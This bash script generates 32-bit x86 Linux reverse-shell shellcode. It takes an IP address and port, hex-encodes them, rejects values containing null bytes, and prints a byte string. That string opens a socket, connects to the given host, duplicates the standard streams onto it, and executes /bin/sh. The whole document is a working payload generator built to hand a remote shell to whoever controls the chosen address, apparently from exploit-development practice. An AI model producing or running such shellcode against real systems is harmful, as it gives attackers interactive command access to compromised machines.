#!/bin/bash

usage() {
	echo "
Usage: $0 -i <ip> -p <port>
	ip  : must be a valid IP address, not broadcast
	port: must be greater than 1024 and corresponding hex value must not contain '0x00' value
" 1>&2
	exit 1
}

while getopts ":i:p:" o; do
	case "$o" in
		i)
			if [ -z "${OPTARG}" ]; then
				usage
			fi
			echo "IP: $OPTARG"
			IP=$OPTARG
			;;
		p)
			if [ $OPTARG -le 1024 ]; then
				usage
			fi
		  echo "PORT: $OPTARG"
			PX=$(echo "obase=16; $OPTARG" | bc)
			;;
		*)
			usage
			;;
	esac
done

# validate IP
IP1X=$(printf "%2s" $(echo "obase=16; $(echo $IP | cut -d '.' -f 1)" | bc) | tr [:space:] '0')
IP2X=$(printf "%2s" $(echo "obase=16; $(echo $IP | cut -d '.' -f 2)" | bc) | tr [:space:] '0')
IP3X=$(printf "%2s" $(echo "obase=16; $(echo $IP | cut -d '.' -f 3)" | bc) | tr [:space:] '0')
IP4X=$(printf "%2s" $(echo "obase=16; $(echo $IP | cut -d '.' -f 4)" | bc) | tr [:space:] '0')

if [ "$IP1X" = '0' -o "$IP2X" = '0' -o "$IP3X"  = '0' -o "$IP4X" = '0' ]; then
	echo "invalid IP"
	usage
fi
if [ "$IP1X" = 'FF' -o "$IP2X" = 'FF' -o "$IP3X"  = 'FF' -o "$IP4X" = 'FF' ]; then
	echo "invalid IP"
	usage
fi

# validate PORT
if [ -z "$PX" ]; then
	echo "invalid PORT"
	usage
fi
PORTX=`printf "%4s" "$PX" | tr [:space:] '0'`
HPORTX=`echo $PORTX | cut -c 1-2`
LPORTX=`echo $PORTX | cut -c 3-4`
if [ "$HPORTX" = '00' -o "$LPORTX" = '00' ]; then
	echo "invalid PORT"
	usage
fi

echo "
"
echo \\x6a\\x66\\x58\\x89\\xc7\\x6a\\x01\\x5b\\x99\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\x89\\xf8\\x6a\\x03\\x5b\\x68\\x$IP1X\\x$IP2X\\x$IP3X\\x$IP4X\\x66\\x68\\x$HPORTX\\x$LPORTX\\x6a\\x02\\x59\\x66\\x51\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x6a\\x0b\\x58\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd\\x80
echo "
"

exit 0
